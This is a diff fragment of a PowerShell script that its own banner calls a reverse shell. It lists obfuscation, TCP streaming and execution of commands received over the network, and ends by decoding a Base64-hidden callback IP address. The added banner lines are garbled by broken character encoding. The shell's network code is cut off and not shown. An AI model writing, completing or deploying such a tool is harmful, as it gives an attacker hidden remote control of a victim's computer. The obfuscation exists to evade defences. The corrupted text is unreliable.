@@ -2,12 +2,12 @@ Write-Host "========================================" -ForegroundColor Cyan
 Write-Host "PowerShell Reverse Shell" -ForegroundColor Yellow
 Write-Host "Developpe par: Florent Vinai" -ForegroundColor Green
 Write-Host "========================================" -ForegroundColor Cyan
-Write-Host "#Déobfuscation dynamique (Base64 + char arrays)" -ForegroundColor Yellow
-Write-Host "Construction à la volée d’objets .NET via réflexion" -ForegroundColor Yellow
-Write-Host "PowerShell Reverse Shell" -ForegroundColor Yellow
-Write-Host "PowerShell Reverse Shell" -ForegroundColor Yellow
-Write-Host "PowerShell Reverse Shell" -ForegroundColor Yellow
-Write-Host "PowerShell Reverse Shell" -ForegroundColor Yellow
+Write-Host "#Dï¿½obfuscation dynamique (Base64 + char arrays)" -ForegroundColor Yellow
+Write-Host "Construction ï¿½ la volï¿½e dï¿½objets .NET via rï¿½flexion" -ForegroundColor Yellow
+Write-Host "Ouverture dâ€™un flux TCP et Ã©change de donnÃ©es par Stream" -ForegroundColor Yellow
+Write-Host "ExÃ©cution locale de commandes reÃ§ues sur un canal rÃ©seau" -ForegroundColor Yellow
+Write-Host "Gestion dâ€™un interprÃ©teur PowerShell embarquÃ© (runspace)" -ForegroundColor Yellow
+Write-Host "Nettoyage automatique des flux et ressources .NET" -ForegroundColor Yellow
 Write-Host "========================================" -ForegroundColor Cyan
 Write-Host ""
 $K7mP3 = [Convert]::FromBase64String('MTkyLjE2OC4xLjEwMA=='); $H4xQ2 = -join [char[]]$K7mP3;
